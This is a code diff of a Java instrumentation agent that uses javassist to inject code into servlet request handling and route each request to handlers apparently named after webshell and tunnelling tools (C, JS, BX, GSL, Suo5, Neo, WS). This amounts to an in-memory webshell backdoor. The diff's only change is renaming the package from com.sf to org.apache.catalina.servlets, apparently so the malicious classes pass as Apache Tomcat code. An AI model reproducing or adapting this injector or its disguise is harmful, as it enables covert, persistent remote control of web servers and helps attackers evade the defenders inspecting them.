@@ -1,6 +1,6 @@
-package com.sf;
+package org.apache.catalina.servlets;
 
-import com.sf.utils.ServerDetector;
+import org.apache.catalina.servlets.utils.ServerDetector;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -21,13 +21,13 @@ public class AgentMain {
             "obj.put(\"response\",response);\n" +
             "obj.put(\"session\",session);\n" +
             "java.io.InputStream in=request.getInputStream();\n" +
-            "com.sf.sl.C.doService(obj,url,method,in);\n"+
-            "com.sf.sl.JS.doService(obj,url,method,in);\n"+
-            "com.sf.sl.BX.doService(obj,url,method,in);\n"+
-            "com.sf.sl.GSL.doService(obj,url,method,in);\n"+
-            "com.sf.sl.Suo5.doService(obj,url,method,in);\n"+
-            "com.sf.sl.Neo.doService(obj,url,method,in);\n"+
-            "com.sf.sl.WS.doService(obj,url,method,in);\n";
+            "org.apache.catalina.servlets.sl.C.doService(obj,url,method,in);\n"+
+            "org.apache.catalina.servlets.sl.JS.doService(obj,url,method,in);\n"+
+            "org.apache.catalina.servlets.sl.BX.doService(obj,url,method,in);\n"+
+            "org.apache.catalina.servlets.sl.GSL.doService(obj,url,method,in);\n"+
+            "org.apache.catalina.servlets.sl.Suo5.doService(obj,url,method,in);\n"+
+            "org.apache.catalina.servlets.sl.Neo.doService(obj,url,method,in);\n"+
+            "org.apache.catalina.servlets.sl.WS.doService(obj,url,method,in);\n";
 
     public static void agentmain(String agentArgs, Instrumentation ins) {
         System.out.println("I");
